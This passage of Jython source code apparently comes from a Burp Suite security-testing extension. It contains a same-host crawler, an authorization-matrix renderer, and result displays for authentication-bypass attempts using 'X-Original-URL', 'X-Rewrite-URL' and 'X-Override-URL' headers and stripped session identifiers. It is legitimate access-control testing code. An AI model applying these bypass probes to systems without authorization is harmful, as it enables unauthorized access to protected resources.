        self._tbAuthNewUser.text = self._txtUserDefault.strip()
        self._tbAuthNewUser.setEnabled(True)
        self._btnAuthRun.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._cbAuthColoring.setEnabled(False)
        self._cbAuthGETPOST.setEnabled(False)
        self._cbAuthGETPOST.setSelectedIndex(2)
        self._cbSiteMapDepth.setSelectedIndex(3)
        self._btnAuthNewUserAdd.setEnabled(True)
        self.progressBar.setValue(0)
        self.tableMatrix.getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.getColumnModel().getSelectionModel().addListSelectionListener(self._updateReqResView)
        self._tabAuthPanel.setDividerLocation(0.25)
        self._tabAuthSplitpane.setDividerLocation(0.7)
        self._tabAuthSplitpaneHttp.setDividerLocation(0.5)

        return

    def siteMapGenerator(self, ev):
        t = Thread(target=self.siteMapGeneratorThread, args=[self])
        t.start()
        return

    def siteMapGeneratorThread(self, ev):
        _urlAdd = ""
        for _url in self._tbAuthURL.getText().split('\n'):
            if _url.strip():
                _urlAdd = _url.strip()
                break

        if not _urlAdd:
            self._lblAuthNotification.text = "Please provide minimum one URL!"
            self._lblAuthNotification.setForeground (Color.red)
            return

        if _urlAdd == self._txtURLDefault:
            self._tbAuthURL.setForeground (Color.red)
            self._lblAuthNotification.text = "You can not proceed with default URL, you can right click on any HTTP calls and send it to here."
            self._lblAuthNotification.setForeground (Color.red)
            return

        if not self.isURLValid(str(_urlAdd)):
            self._tbAuthURL.setForeground (Color.red)
            self._lblAuthNotification.text = "URLs should start with 'http/s' and not have any spaces. Please check: '" + _urlAdd + "'"
            self._lblAuthNotification.setForeground (Color.red)
            return

        self._tbAuthURL.setForeground (Color.black)

        if not self._tbAuthHeader.getText().strip() or self._tbAuthHeader.getText().strip() == self._txtHeaderDefault:
            self._tbAuthHeader.setForeground (Color.red)
            self._lblAuthNotification.text = "Please provide a valid header, you can right click on any HTTP calls and send it to here."
            self._lblAuthNotification.setForeground (Color.red)
            return        

        self._tbAuthHeader.setForeground (Color.black)        
        self._lblAuthNotification.setForeground (Color.black)

        self._lblAuthNotification.text = "The crawler has just started. Please bear in mind, links based on Javascript may not be detected properly."
        self._btnAuthNewUserAdd.setEnabled(False)
        self._tbAuthNewUser.setEnabled(False)
        self._cbSiteMapDepth.setEnabled(False)
        self._btnSiteMapGeneratorRun.setEnabled(False)
        self._tbAuthHeader.setEnabled(False)
        self._tbAuthURL.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._btnAuthRun.setEnabled(False)
        self._cbAuthColoring.setEnabled(False)
        self._cbAuthGETPOST.setEnabled(False)

        for line in self._tbAuthURL.getText().split('\n'):
            if line.strip():
                self._tbAuthURL.setText(line)
                break

        _userURLs = []
        _userURLs.append(_urlAdd)
        folderDepth = 0
        crawledURLs = 0
        header = self._tbAuthHeader.getText()
        userLinks = _urlAdd + "\n"

        for _url in _userURLs:
            try:
                # changing new url path in the request header
                parts = _url.split('/', 3)
                path = " / " if len(parts) < 4 or not parts[3] else " /" + parts[3] + " "
                header =  header.replace(str(header.splitlines()[0]), header.splitlines()[0].split(" ", 2)[0] + path + header.splitlines()[0].split(" ", 2)[2])
                
                # header methods
                if "GET" in header[:3]:
                    # request was in GET method and will be in POST
                    if self._cbAuthGETPOST.getSelectedIndex() == 1:
                        header = self._callbacks.getHelpers().toggleRequestMethod((header))
                else:
                    # request was in POST alike method and will be in GET
                    if self._cbAuthGETPOST.getSelectedIndex() == 0:
                        header = self._callbacks.getHelpers().toggleRequestMethod((header))
                
                portNum = 80
                if urlparse.urlparse(_url).port:
                    portNum = urlparse.urlparse(_url).port
                else:
                    if urlparse.urlparse(_url).scheme == "https":
                        portNum = 443

                _httpReqRes = self._callbacks.makeHttpRequest(self._helpers.buildHttpService(urlparse.urlparse(_url).hostname, portNum, urlparse.urlparse(_url).scheme), header)
                responseStatus = str(self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getStatusCode())
                if _urlAdd == _url:
                    if not responseStatus.startswith("2"):
                        self._lblAuthNotification.text = "The user's header is returning 'HTTP " + responseStatus + "'. Please provide a valid header and URL."
                        self._btnAuthNewUserAdd.setEnabled(True)
                        self._tbAuthNewUser.setEnabled(True)
                        self._cbSiteMapDepth.setEnabled(True)
                        self._btnSiteMapGeneratorRun.setEnabled(True)
                        self._tbAuthHeader.setEnabled(True)
                        self._tbAuthURL.setEnabled(True)
                        self._btnAuthReset.setEnabled(True)
                        self._btnAuthRun.setEnabled(True)
                        self._cbAuthColoring.setEnabled(True)
                        self._cbAuthGETPOST.setEnabled(True)
                        return

                msgBody = self._helpers.bytesToString(_httpReqRes.getResponse()[self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getBodyOffset():])

                if msgBody:
                    links = re.findall("(https?://[^\\s\'\"<]+)", msgBody, re.IGNORECASE)
                    for link in links:
                        _ext = os.path.splitext(urlparse.urlparse(link).path)[1]
                        if link not in _userURLs and link and urlparse.urlparse(_url).hostname == urlparse.urlparse(link).hostname and not any(re.findall(url_regex, link, re.IGNORECASE)) and "/." not in link and not any(re.findall(ext_regex, _ext, re.IGNORECASE)):
                            _userURLs.append(link)
                            userLinks = userLinks + link + "\n"
                            self._lblAuthNotification.text = "The crawler has found '" + str(len(_userURLs)) + "' links so far, and it is still in progress: '" + str(_userURLs.index(_url) + 1) + "/" + str(crawledURLs + 1) + "', current folder depth: '" + str(folderDepth) + "'."

                    links = re.findall("<a\\s+[^>]*?href=[\'|\"](.*?)[\'\"].*?>", msgBody, re.IGNORECASE)
                    for link in (links.pop(0) for _ in xrange(len(links))):
                        if not ".." in link:
                            link = link.replace("/.", "/")
                        if link == ".":
                            link = "/"
                        if "%3a" in link[0:10]:
                            link =  urllib.unquote(link)

                        if '"' in link or '%22' in link or '%3c' in link or '<' in link or 'script' in link:
                            # abnormal urls to be excluded
                            link = ""
                            continue
                        elif link.startswith('/'):
                            link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + link
                        elif link.startswith('#'):
                            if link == '#':
                                link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + urlparse.urlparse(_url)[2]
                            else:
                                link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + urlparse.urlparse(_url)[2] + link
                        elif link.startswith('..'):
                            path = urlparse.urlparse(_url)[2]
                            if not path.endswith('/'):
                                path = str(urlparse.urlparse(_url)[2]).rsplit('/', 1)[0] + "/"
                            _endswith =""
                            if link.endswith('/'):
                                _endswith ="/"
                            link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + str(posixpath.normpath(path + link)) + _endswith
                        elif not link.startswith('http') and link:
                            link = urlparse.urljoin(_url, link)
                        else: 
                            link = ""
                            continue

                        _ext = os.path.splitext(urlparse.urlparse(link).path)[1]

                        if link not in _userURLs and link and urlparse.urlparse(_url).hostname == urlparse.urlparse(link).hostname and not any(re.findall(url_regex, link, re.IGNORECASE)) and "/." not in link and not any(re.findall(ext_regex, _ext, re.IGNORECASE)):
                            _userURLs.append(link)
                            userLinks = userLinks + link + "\n"
                            self._lblAuthNotification.text = "The crawler has found '" + str(len(_userURLs)) + "' links so far, and it is still in progress: '" + str(_userURLs.index(_url) + 1) + "/" + str(crawledURLs + 1) + "', current folder depth: '" + str(folderDepth) + "'."

                    if _userURLs.index(_url) == crawledURLs:
                        if folderDepth == self._cbSiteMapDepth.getSelectedIndex():
                            break
                        crawledURLs = len(_userURLs) - 1
                        folderDepth = folderDepth + 1

            except:
                print("[ERROR] Spider: " + str(sys.exc_info()[1]))

        self._tbAuthURL.setText(userLinks)
        if len(_userURLs) > 1:
            self._lblAuthNotification.text = "The crawler has just finished, and '" + str(len(_userURLs)) + "' links have been found with folder depth '"+ str(self._cbSiteMapDepth.getSelectedIndex()) +"'. Other hosts than user's session are ignored." 
        else:
            self._lblAuthNotification.text = "The crawler has just finished, and no any links have been found." 
        self._btnAuthNewUserAdd.setEnabled(True)
        self._tbAuthNewUser.setEnabled(True)
        self._cbSiteMapDepth.setEnabled(True)
        self._btnSiteMapGeneratorRun.setEnabled(True)
        self._tbAuthHeader.setEnabled(True)
        self._tbAuthURL.setEnabled(True)
        self._btnAuthReset.setEnabled(True)
        self._btnAuthRun.setEnabled(True)
        self._cbAuthColoring.setEnabled(True)
        self._cbAuthGETPOST.setEnabled(True)
        return

class UserEnabledRenderer(TableCellRenderer):
    _colorsRed = False
    _colorsOrange = False
    _colorsYellow = False
    def __init__(self, defaultCellRender, userList, tipMessages):
        UserEnabledRenderer._colorsRed = False
        UserEnabledRenderer._colorsOrange = False
        UserEnabledRenderer._colorsYellow = False
        self._defaultCellRender = defaultCellRender
        self.userList = userList
        self.tipMessages = tipMessages
        self.focusX = -1
        self.focusY = -1
        self.colorsUser = [Color(204, 229, 255), Color(204, 255, 204), Color(204, 204, 255), Color(190,220,210)]
        self.colorsAlert = [Color.white, Color(255, 153, 153), Color(255, 218, 185), Color(255, 255, 204), Color(233, 233, 233), Color(255, 204, 204)]

    def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
        cell = self._defaultCellRender.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column)
        toolTipMessage = ""
        cell.setBackground(self.colorsAlert[0])
        if len(self.userList[0]) < 10:
            # Authorization Matrix Tab
            try:
                if column == 0:
                    toolTipMessage = "URL list."
                elif table.getValueAt(row, column) and not table.getValueAt(row, column).startswith("HTTP 2") and not table.getValueAt(row, column).startswith("HTTP 3"):
                    # error or http 4XX/5XX
                    cell.setBackground(self.colorsAlert[4])
                    toolTipMessage = "The request returns HTTP 4XX/5xx response!"
                elif column == 1:
                    # no auth
                    if _colorful:
                        for y in range(2, table.getColumnCount()):
                            if table.getValueAt(row, 0) in self.userList[y - 1]:
                                if table.getValueAt(row, y) == table.getValueAt(row, column):
                                    if table.getValueAt(row, y).startswith("HTTP 2"):
                                        cell.setBackground(self.colorsAlert[1])
                                        toolTipMessage = "The URL returns HTTP 2XX without authentication, and the response is same as URL owner!"
                                    elif table.getValueAt(row, y).startswith("HTTP 3"):
                                        if not cell.getBackground() == self.colorsAlert[1] and not cell.getBackground() == self.colorsAlert[2]:
                                            cell.setBackground(self.colorsAlert[3])
                                            toolTipMessage = "The URL returns HTTP 3XX without authentication, but the response is same as URL owner!"
                                elif table.getValueAt(row, y)[:8] == table.getValueAt(row, column)[:8]:
                                    if not cell.getBackground() == self.colorsAlert[1]:
                                        cell.setBackground(self.colorsAlert[2])
                                        toolTipMessage = "The URL returns same HTTP response code with URL owner, but no authentication!"
                elif table.getValueAt(row, 0) in self.userList[column - 1]:
                    cell.setBackground(self.colorsUser[column - 2])
                    toolTipMessage = "Http response of the user's own URL!"
                else:    
                    # other users
                    if _colorful:
                        for y in range(2, table.getColumnCount()):
                            if table.getValueAt(row, 0) in self.userList[y - 1]:
                                if table.getValueAt(row, y) == table.getValueAt(row, column):
                                    if table.getValueAt(row, y).startswith("HTTP 2"):
                                        cell.setBackground(self.colorsAlert[1])
                                        toolTipMessage = "The URL is not in the user's list, but the response (HTTP 2XX) is same as URL owner!"
                                    elif table.getValueAt(row, y).startswith("HTTP 3"):
                                        if not cell.getBackground() == self.colorsAlert[1] and not cell.getBackground() == self.colorsAlert[2]:
                                            cell.setBackground(self.colorsAlert[3])
                                            toolTipMessage = "The URL is not in the user's list, but the response (HTTP 3XX) is same as URL owner!"
                                elif table.getValueAt(row, y)[:8] == table.getValueAt(row, column)[:8]:
                                    if not cell.getBackground() == self.colorsAlert[1]:    
                                        cell.setBackground(self.colorsAlert[2])
                                        toolTipMessage = "The URL is not in the user's list, but returns same HTTP response code with URL owner!"
                cell.setToolTipText(toolTipMessage)

                if hasFocus:
                    self.focusX = row
                    self.focusY = column
                    cell.setFont(cell.getFont().deriveFont(Font.BOLD | Font.ITALIC))
                    table.repaint()
                elif self.focusX == row and column == 0:
                    cell.setFont(cell.getFont().deriveFont(Font.BOLD | Font.ITALIC))
                    table.repaint()
            except:
                pass

        else:
            #Authentication Bypass Tab
            try:
                if table.getValueAt(row, column):
                    toolTipMessage = self.tipMessages[row][column]

                    if column == 0:
                        if cell.getBackground() == self.colorsAlert[0]:
                            for y in range(1, table.getColumnCount()):
                                if table.getCellRenderer(row, y).getTableCellRendererComponent(table, value, isSelected, hasFocus, row, y).getBackground() == self.colorsAlert[1]:
                                    cell.setBackground(self.colorsAlert[1])
                                    UserEnabledRenderer._colorsRed = True
                                    break
                            if not cell.getBackground() == self.colorsAlert[1]:
                                for y in range(1, table.getColumnCount()):
                                    if table.getCellRenderer(row, y).getTableCellRendererComponent(table, value, isSelected, hasFocus, row, y).getBackground() == self.colorsAlert[2]:
                                        cell.setBackground(self.colorsAlert[2])
                                        UserEnabledRenderer._colorsOrange = True
                                        break
                            if not cell.getBackground() == self.colorsAlert[1] and not cell.getBackground() == self.colorsAlert[2]:
                                for y in range(1, table.getColumnCount()):
                                    if table.getCellRenderer(row, y).getTableCellRendererComponent(table, value, isSelected, hasFocus, row, y).getBackground() == self.colorsAlert[3]:
                                        cell.setBackground(self.colorsAlert[3])
                                        UserEnabledRenderer._colorsYellow = True
                                        break
                    elif column == 1:
                        if str(table.getValueAt(row, column)).startswith("2"):
                            cell.setBackground(self.colorsAlert[1])
                            UserEnabledRenderer._colorsRed = True
                            toolTipMessage = "The response returns HTTP 2XX, even though all session identifiers have been removed!\n" + self.tipMessages[row][column]
                    else:
                        if column == 32:
                          toolTipMessage = "'X-Original-URL' parameter has been added to the header."
                          if str(table.getValueAt(row, column)).endswith("-"):
                              toolTipMessage = self.tipMessages[row][column] + ". '-' shows it returns same response with '/' root path."
                        elif column == 33:
                          toolTipMessage = "'X-Rewrite-URL' parameter has been added to the header."
                          if str(table.getValueAt(row, column)).endswith("-"):
                              toolTipMessage = self.tipMessages[row][column] + ". '-' shows it returns same response with '/' root path."
                        elif column == 34:
                          toolTipMessage = "'X-Override-URL' parameter has been added to the header."
                          if str(table.getValueAt(row, column)).endswith("-"):
                              toolTipMessage = self.tipMessages[row][column] + ". '-' shows it returns same response with '/' root path."

                        if not str(table.getValueAt(row, 1)).startswith("2"):
                            if str(table.getValueAt(row, column)).startswith("2") and not str(table.getValueAt(row, column)).endswith("-"):
                                if str(table.getValueAt(row, column)).endswith("(EmptyBody)"):
                                    toolTipMessage = "The bypass attempt returns HTTP 2XX, but no response body!\n" + self.tipMessages[row][column]
                                else:
                                    cell.setBackground(self.colorsAlert[1])
                                    UserEnabledRenderer._colorsRed = True
                                    toolTipMessage = "The bypass attempt returns HTTP 2XX!\n" + self.tipMessages[row][column]

                    cell.setToolTipText(toolTipMessage)

                    if hasFocus:
                        self.focusX = row
                        self.focusY = column
                        if not cell.getBackground() == self.colorsAlert[1] and not cell.getBackground() == self.colorsAlert[2] and not cell.getBackground() == self.colorsAlert[3]:
                            cell.setBackground(Color(219,219,219))
                        cell.setFont(cell.getFont().deriveFont(Font.BOLD | Font.ITALIC))
                        table.repaint()
                    elif self.focusX == row and column == 0:
                        cell.setFont(cell.getFont().deriveFont(Font.BOLD | Font.ITALIC))
                        table.repaint()
            except:
                pass
        return cell

class CustomDefaultTableModel(DefaultTableModel):
    def __init__(self, data, headings):
        DefaultTableModel.__init__(self, data, headings)

    def isCellEditable(self, row, col):
        return False

class URLFilter:
    def __init__(self):
        self.patterns_seen = set()

    def _normalize_url(self, full_url):
        parsed = urlparse.urlparse(full_url)
        path = parsed.path.strip("/")
        norm_parts = path.split("/")

        normalized_path_parts = []
        uuid_like = re.compile(
            r"^[a-f0-9]{8}-[a-f0-9]{4}-[1-5][a-f0-9]{3}-[89ab][a-f0-9]{3}-[a-f0-9]{12}$", re.IGNORECASE
        )

        for part in norm_parts:
            if uuid_like.match(part):
                normalized_path_parts.append("{id}")
            elif part.isdigit() and int(part) >= 10000:
                normalized_path_parts.append("{id}")
            elif re.match(r"^[a-zA-Z0-9]+$", part) and sum(c.isdigit() for c in part) >= 3:
                normalized_path_parts.append("{id}")
            else:
                normalized_path_parts.append(part)

        normalized = "/" + "/".join(normalized_path_parts)

        if parsed.query:
            query_params = parsed.query.split("&")
            norm_query_parts = []
            for param in query_params:
                if "=" in param:
                    key, value = param.split("=", 1)
                    if uuid_like.match(value) or (value.isdigit() and int(value) >= 10000) or (re.match(r"^[a-zA-Z0-9]+$", value) and sum(c.isdigit() for c in value) >= 3):
                        value = "{id}"
                    norm_query_parts.append(key + "=" + value)
                else:
                    norm_query_parts.append(param)
            norm_query_parts.sort()
            normalized += "?" + "&".join(norm_query_parts)

        return normalized

    def should_process(self, url):
        norm = self._normalize_url(url)
        if norm in self.patterns_seen:
            return False
        else:
            self.patterns_seen.add(norm)
            return True

class MyFocusListener(FocusListener):
    def __init__(self, textPane, placeholder):
        self.textPane = textPane
        self.placeholder = placeholder

    def focusGained(self, event):
        if self.textPane.getText() == self.placeholder:
            self.textPane.setText("")
            self.textPane.setForeground(Color.BLACK)

    def focusLost(self, event):
        if self.textPane.getText().strip() == "":
            self.textPane.setText(self.placeholder)
            self.textPane.setForeground(Color.GRAY)
